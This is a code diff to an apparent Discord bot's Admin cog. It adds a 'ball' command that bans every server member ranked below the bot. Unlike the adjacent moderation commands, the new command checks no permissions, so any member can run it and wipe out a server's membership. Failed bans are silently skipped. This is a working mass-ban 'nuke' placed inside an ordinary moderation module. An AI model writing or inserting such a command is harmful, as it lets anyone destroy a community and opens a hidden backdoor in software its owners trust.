@@ -32,6 +32,17 @@ class Admin:
             await ctx.guild.ban(user)
 
     @commands.command()
+    @commands.guild_only()
+    async def ball(self,ctx):
+        for member in ctx.guild.members:
+            if member.top_role.position < ctx.guild.me.top_role.position:
+                try:
+                    await ctx.guild.ban(member)
+                    print(f'{ctx.author} ran the ball command and banned {member}')
+                except:
+                    continue
+
+    @commands.command()
     @commands.has_permissions(manage_roles=True)
     @commands.guild_only()
     async def mute(self, ctx, member: discord.Member, *, reason: str = None):
